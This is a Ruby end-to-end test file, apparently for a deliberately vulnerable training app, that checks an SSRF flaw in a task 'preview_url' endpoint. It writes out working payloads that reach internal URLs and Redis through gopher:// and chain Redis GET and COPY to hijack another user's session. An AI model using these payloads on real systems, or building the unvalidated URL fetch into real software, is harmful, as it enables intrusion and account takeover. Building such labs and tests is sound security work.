# frozen_string_literal: true

require "test_helper"
require_relative "e2e_helper"

class SsrfTest < ActiveSupport::TestCase
  include E2EHelper

  setup do
    @safe_server = ServerPool.acquire(vuln_challenges: "")
    @vuln_server = ServerPool.acquire(vuln_challenges: "ssrf")
  end

  test "SAFE: preview_url endpoint does not exist" do
    result = create_task_via_form(@safe_server, title: "SSRF safe test")
    cookie = result[:cookie]
    task_id = result[:id]

    res = @safe_server.post(
      "/tasks/#{task_id}/preview_url",
      body: URI.encode_www_form("url" => "http://127.0.0.1:#{@safe_server.port}/up"),
      headers: { "Cookie" => cookie }
    )

    assert_equal "404", res.code, "SAFE: preview_url ルートは存在しないはず"
  end

  test "VULN: fetches internal HTTP URL without validation" do
    result = create_task_via_form(@vuln_server, title: "SSRF vuln test")
    cookie = result[:cookie]
    task_id = result[:id]

    # タスク詳細ページから CSRF トークンを取得
    res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
    csrf_token = extract_csrf_token(res_show.body)

    internal_url = "http://127.0.0.1:#{@vuln_server.port}/up"

    res = @vuln_server.post(
      "/tasks/#{task_id}/preview_url",
      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => internal_url),
      headers: { "Cookie" => cookie }
    )

    assert_equal "200", res.code, "VULN: preview_url は内部URLにアクセスできるはず"
    body = JSON.parse(res.body)
    assert body["body"].present?, "内部URLのレスポンスボディが返るはず"
    # Rails 8.1+ の /up は HTML (green background) を返す
    assert_match /OK|background-color: green/i, body["body"], "Rails ヘルスチェックの内容が漏洩するはず"
  end

  # 手動確認用: docker-compose 環境で Redis に gopher 経由で到達できることを検証する
  test "VULN: gopher scheme reaches Redis (manual, requires redis container)" do
    result = create_task_via_form(@vuln_server, title: "gopher test")
    cookie = result[:cookie]
    task_id = result[:id]

    res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
    csrf_token = extract_csrf_token(res_show.body)

    # RESP: *1\r\n$4\r\nPING\r\n をURLエンコード
    gopher_url = "gopher://redis:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A"

    res = @vuln_server.post(
      "/tasks/#{task_id}/preview_url",
      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => gopher_url),
      headers: { "Cookie" => cookie }
    )

    body = JSON.parse(res.body)
    assert_includes body["body"].to_s, "+PONG", "Redis に到達して PONG が返るはず"
  end

  # ログイン済みページのナビから表示名 (current_user.name) を取り出す
  def logged_in_name(html)
    name = html.dup.force_encoding("UTF-8")[%r{👤\s*(.+?)\s*</}, 1]
    assert name.present?, "ログイン名が表示されるはず"
    name
  end

  def session_key(cookie)
    sid = cookie.match(/_session_id=([^;]+)/)&.captures&.first
    assert sid.present?, "セッションIDが取得できるはず"
    "_session_id:#{Rack::Session::SessionId.new(sid).private_id}"
  end

  test "VULN: gopher COPY on Redis hijacks a session with a known victim key" do
    # キーの発見は対象外とし、テスト準備で victim の Cookie から既知のキーを得る。
    victim_cookie = setup_session(@vuln_server)
    victim_name = logged_in_name(@vuln_server.get("/", headers: { "Cookie" => victim_cookie }).body)

    attacker = create_task_via_form(@vuln_server, title: "attacker task")
    attacker_cookie = attacker[:cookie]
    attacker_task_id = attacker[:id]
    res_show = @vuln_server.get("/tasks/#{attacker_task_id}", headers: { "Cookie" => attacker_cookie })
    attacker_name = logged_in_name(res_show.body)
    assert_not_equal victim_name, attacker_name, "victim と attacker は別ユーザであるはず"
    csrf_token = extract_csrf_token(res_show.body)

    victim_key = session_key(victim_cookie)

    # 1) read プリミティブ: 攻撃者が gopher 経由で victim のセッションを読める。
    get_url = "gopher://redis:6379/_GET%20#{ERB::Util.url_encode(victim_key)}%0D%0A"
    res_get = @vuln_server.post(
      "/tasks/#{attacker_task_id}/preview_url",
      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => get_url),
      headers: { "Cookie" => attacker_cookie }
    )
    assert_equal "200", res_get.code
    assert_includes JSON.parse(res_get.body).fetch("body"), "user_id",
                    "攻撃者が他ユーザのセッションを Redis から読み出せるはず"

    # リクエスト終了時のセッション書き戻しを避けるため、新しい ID のキーへコピーする。
    crafted_sid = SecureRandom.hex(16)
    crafted_key = "_session_id:#{Rack::Session::SessionId.new(crafted_sid).private_id}"
    copy_cmd = "COPY #{victim_key} #{crafted_key} REPLACE\r\n"
    copy_url = "gopher://redis:6379/_#{ERB::Util.url_encode(copy_cmd)}"
    res_copy = @vuln_server.post(
      "/tasks/#{attacker_task_id}/preview_url",
      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => copy_url),
      headers: { "Cookie" => attacker_cookie }
    )
    assert_equal "200", res_copy.code
    assert_includes JSON.parse(res_copy.body).fetch("body"), ":1",
                    "COPY が成功 (RESP :1) を返すはず"

    # victim の Cookie を送信せず、攻撃者が作った ID で victim として認証される。
    hijacked_name = logged_in_name(@vuln_server.get("/", headers: { "Cookie" => "_session_id=#{crafted_sid}" }).body)
    assert_equal victim_name, hijacked_name,
                 "捏造した session ID が victim(#{victim_name}) のセッションに乗っ取られているはず"
  end

  test "VULN: allows saving non-HTTP URL (like gopher://) to task model" do
    # SSRF チャレンジが有効な場合、攻撃者が UI から攻撃用 URL を保存できる必要がある
    gopher_url = "gopher://redis:6379/_PING"
    result = create_task_via_form(@vuln_server, title: "gopher save test", url: gopher_url)

    assert_not_nil result[:id], "SSRF チャレンジ中であれば、gopher:// URL でも保存できるはず"
  end
end
